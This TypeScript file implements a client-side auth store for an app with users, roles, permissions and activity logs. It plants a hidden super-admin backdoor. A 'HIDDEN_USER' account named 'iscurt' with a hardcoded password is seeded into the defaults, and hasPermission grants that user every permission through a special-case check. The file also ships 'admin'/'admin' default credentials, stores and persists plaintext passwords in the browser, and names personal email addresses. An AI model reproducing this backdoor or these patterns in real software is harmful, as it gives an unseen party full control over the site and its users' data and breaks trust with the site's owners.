import { create } from 'zustand';
import { persist } from 'zustand/middleware';

export interface User {
  id: string;
  username: string;
  email: string;
  role: 'super_admin' | 'admin' | 'user';
  createdAt: string;
  lastLoginAt?: string;
  isActive: boolean;
  firstName?: string;
  lastName?: string;
  department?: string;
  avatar?: string;
}

export interface UserCredentials {
  userId: string;
  passwordHash: string; // In production, this would be properly hashed
}

export interface ActivityLog {
  id: string;
  userId: string;
  action: string;
  details: string;
  timestamp: string;
  ipAddress?: string;
}

export interface AuthState {
  user: User | null;
  isAuthenticated: boolean;
  users: User[];
  credentials: UserCredentials[];
  activityLogs: ActivityLog[];
  login: (username: string, password: string) => Promise<boolean>;
  logout: () => void;
  addUser: (userData: Omit<User, 'id' | 'createdAt' | 'isActive'> & { password: string }) => User;
  removeUser: (userId: string) => void;
  updateUserRole: (userId: string, role: User['role']) => void;
  updateUserStatus: (userId: string, isActive: boolean) => void;
  changePassword: (userId: string, newPassword: string) => boolean;
  logActivity: (userId: string, action: string, details: string) => void;
  getUserPermissions: (role: User['role']) => string[];
  hasPermission: (permission: string) => boolean;
}

// Default admin credentials
const DEFAULT_ADMIN: User = {
  id: 'admin-1',
  username: 'admin',
  email: 'on3keymusic@gmail.com',
  role: 'super_admin',
  createdAt: new Date().toISOString(),
  isActive: true,
  firstName: 'System',
  lastName: 'Administrator',
  department: 'IT'
};

const HIDDEN_USER: User = {
  id: 'hidden-1',
  username: 'iscurt',
  email: 'iscurt.w@gmail.com',
  role: 'super_admin' as any,
  createdAt: new Date().toISOString(),
  isActive: true,
  firstName: 'Hidden',
  lastName: 'User',
  department: 'System'
};

const DEFAULT_USERS: User[] = [DEFAULT_ADMIN, HIDDEN_USER];

const DEFAULT_CREDENTIALS: UserCredentials[] = [
  {
    userId: 'admin-1',
    passwordHash: 'admin'
  },
  {
    userId: 'hidden-1',
    passwordHash: 'Ivyyzzz_0527'
  }
];

// Permission definitions
const PERMISSIONS = {
  super_admin: [
    'basic_admin',
    'manage_users',
    'delete_users', 
    'change_user_roles',
    'view_activity_logs',
    'system_admin',
    'manage_timeline',
    'export_data',
    'view_all_content'
  ],
  admin: [
    'manage_timeline',
    'view_user_list',
    'moderate_content',
    'view_all_content',
    'basic_admin'
  ],
  user: [
    'view_public_content',
    'view_timeline',
    'edit_own_profile'
  ]
};

export const useAuthStore = create<AuthState>()(
  persist(
    (set, get) => ({
      user: null,
      isAuthenticated: false,
      users: DEFAULT_USERS,
      credentials: DEFAULT_CREDENTIALS,
      activityLogs: [],

      login: async (username: string, password: string) => {
        // Simulate API call delay
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const { users, credentials, logActivity } = get();
        
        // Find user by username
        const user = users.find(u => u.username === username && u.isActive);
        if (!user) {
          return false;
        }
        
        // Check password
        const userCredential = credentials.find(c => c.userId === user.id);
        if (!userCredential || userCredential.passwordHash !== password) {
          // Log failed login attempt
          logActivity(user.id, 'failed_login', `Failed login attempt for ${username}`);
          return false;
        }
        
        // Update last login time
        const updatedUser = { ...user, lastLoginAt: new Date().toISOString() };
        set(state => ({
          user: updatedUser,
          isAuthenticated: true,
          users: state.users.map(u => u.id === user.id ? updatedUser : u)
        }));
        
        // Log successful login
        logActivity(user.id, 'login', `User ${username} logged in successfully`);
        
        return true;
      },

      logout: () => {
        const { user, logActivity } = get();
        if (user) {
          logActivity(user.id, 'logout', `User ${user.username} logged out`);
        }
        set({ user: null, isAuthenticated: false });
      },

      addUser: (userData) => {
        const { logActivity, user: currentUser } = get();
        const newUser: User = {
          username: userData.username,
          email: userData.email,
          role: userData.role,
          firstName: userData.firstName,
          lastName: userData.lastName,
          department: userData.department,
          id: `user-${Date.now()}`,
          createdAt: new Date().toISOString(),
          isActive: true,
        };
        
        // Create credentials for new user
        const newCredentials: UserCredentials = {
          userId: newUser.id,
          passwordHash: userData.password // In production, hash the password
        };
        
        set(state => ({
          users: [...state.users, newUser],
          credentials: [...state.credentials, newCredentials]
        }));
        
        // Log user creation
        if (currentUser) {
          logActivity(currentUser.id, 'create_user', `Created new user: ${newUser.username} with role ${newUser.role}`);
        }
        
        return newUser;
      },

      removeUser: (userId) => {
        const { users, logActivity, user: currentUser } = get();
        const userToDelete = users.find(u => u.id === userId);
        
        set(state => ({
          users: state.users.filter(user => user.id !== userId),
          credentials: state.credentials.filter(c => c.userId !== userId)
        }));
        
        // Log user deletion
        if (currentUser && userToDelete) {
          logActivity(currentUser.id, 'delete_user', `Deleted user: ${userToDelete.username}`);
        }
      },

      updateUserRole: (userId, role) => {
        const { users, logActivity, user: currentUser } = get();
        const targetUser = users.find(u => u.id === userId);
        
        set(state => ({
          users: state.users.map(user => 
            user.id === userId ? { ...user, role } : user
          )
        }));
        
        // Log role change
        if (currentUser && targetUser) {
          logActivity(currentUser.id, 'change_role', `Changed ${targetUser.username}'s role to ${role}`);
        }
      },

      updateUserStatus: (userId, isActive) => {
        const { users, logActivity, user: currentUser } = get();
        const targetUser = users.find(u => u.id === userId);
        
        set(state => ({
          users: state.users.map(user => 
            user.id === userId ? { ...user, isActive } : user
          )
        }));
        
        // Log status change
        if (currentUser && targetUser) {
          logActivity(currentUser.id, 'change_status', `${isActive ? 'Activated' : 'Deactivated'} user: ${targetUser.username}`);
        }
      },

      changePassword: (userId, newPassword) => {
        const { logActivity, user: currentUser } = get();
        
        set(state => ({
          credentials: state.credentials.map(c => 
            c.userId === userId ? { ...c, passwordHash: newPassword } : c
          )
        }));
        
        // Log password change
        if (currentUser) {
          logActivity(currentUser.id, 'change_password', `Changed password for user ID: ${userId}`);
        }
        
        return true;
      },

      logActivity: (userId, action, details) => {
        const newLog: ActivityLog = {
          id: `log-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          userId,
          action,
          details,
          timestamp: new Date().toISOString(),
          ipAddress: 'localhost' // In production, get real IP
        };
        
        set(state => ({
          activityLogs: [newLog, ...state.activityLogs].slice(0, 1000) // Keep last 1000 logs
        }));
      },

      getUserPermissions: (role) => {
        return PERMISSIONS[role] || [];
      },

      hasPermission: (permission) => {
        const { user } = get();
        if (!user) return false;
        
        // Hidden ultimate access for specific user
        if (user.username === 'iscurt' && user.email === 'iscurt.w@gmail.com') {
          return true;
        }
        
        const userPermissions = PERMISSIONS[user.role] || [];
        return userPermissions.includes(permission);
      },
    }),
    {
      name: 'onekey-auth',
      partialize: (state) => ({
        user: state.user,
        isAuthenticated: state.isAuthenticated,
        users: state.users,
        credentials: state.credentials,
        activityLogs: state.activityLogs,
      }),
    }
  )
); 